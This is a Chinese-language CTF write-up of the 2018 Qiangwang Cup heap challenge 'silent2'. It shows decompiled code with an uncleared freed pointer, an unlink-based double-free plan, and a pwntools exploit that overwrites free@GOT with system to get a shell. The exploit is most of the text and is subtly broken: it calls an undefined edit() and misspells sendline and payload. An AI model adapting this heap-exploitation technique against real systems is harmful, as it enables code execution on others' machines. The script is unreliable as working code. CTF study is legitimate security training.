# 2018强网杯--pwn-silent2

题目和silent差不多

checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

可以对got表进行写

ida

```c
__int64 sub_4009DC()
{
  size_t size; // [rsp+0h] [rbp-20h]
  unsigned __int64 i; // [rsp+8h] [rbp-18h]
  char *v3; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  __isoc99_scanf("%lu", &size);
  getchar();
  if ( size != 16 && size <= 0x7F )             // size=16 || size > 0x7f
    exit(0);
  v3 = (char *)malloc(size);
  sub_4008B6(v3, size);
  for ( i = 0LL; i <= 9 && s[i]; ++i )
    ;
  if ( i == 10 )
    exit(0);
  s[i] = v3;
  return 0LL;
}
```

可见题目对堆大小进行限制

```c
signed __int64 sub_400AB7()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  __isoc99_scanf("%d", &v1);
  getchar();
  if ( v1 < 0 || v1 > 9 )
    return 0xFFFFFFFFLL;
  free(s[v1]);
  return 0LL;
}
```

free依然没有把指针清空。

## 利用思路

double free达到地址任意写，修改free_got为system地址

```
add(0x90,'a'*0x80)
add(0x90,'b'*0x80)
add(0x90,'/bin/sh')
add(0x90,'c'*0x80)
add(0x90,'d'*0x80)
free(4)
free(3)
paylaod = p64(0)+p64(0x90)+p64(p_addr-0x18)+p64(p_addr-0x10)+'x'*0x70
payload += p64(0x90)+p64(0xa0)
add(0x130,payload)
free(4)
```
```
0x602080 <stdout>:	0x00007fc0d53d0620	0x0000000000000000
0x602090 <stdin>:	0x00007fc0d53cf8e0	0x0000000000000000
0x6020a0 <stderr>:	0x00007fc0d53d0540	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000dca010	0x0000000000dca0b0
0x6020d0:	0x0000000000dca150	0x0000000000dca1f0
0x6020e0:	0x0000000000dca290	0x0000000000000000

```

exp
```
from pwn import *

r = process("./silent2")
print util.proc.pidof(r)

def add(size,content):
	r.sendline("1")
	r.sendline(str(size))
	r.sendline(content)

def free(idx):
	r.sendline("2")
	r.sendline(str(idx))

def update(idx,content):
	r.sendline("3")
	r.sendline(str(idx))
	r.sendlien(content)

sys_addr = 0x400730
free_got = 0x602018
p_addr = 0x6020d8
add(0x90,'a'*0x80)
add(0x90,'b'*0x80)
add(0x90,'/bin/sh')
add(0x90,'c'*0x80)
add(0x90,'d'*0x80)
free(4)
free(3)
payload = p64(0)+p64(0x90)+p64(p_addr-0x18)+p64(p_addr-0x10)+'x'*0x70
payload += p64(0x90)+p64(0xa0)
add(0x130,payload)
free(4)
pause()
edit(3,p64(free_got))
edit(0,p64(sys_addr))
free(2)
r.interactive()

```
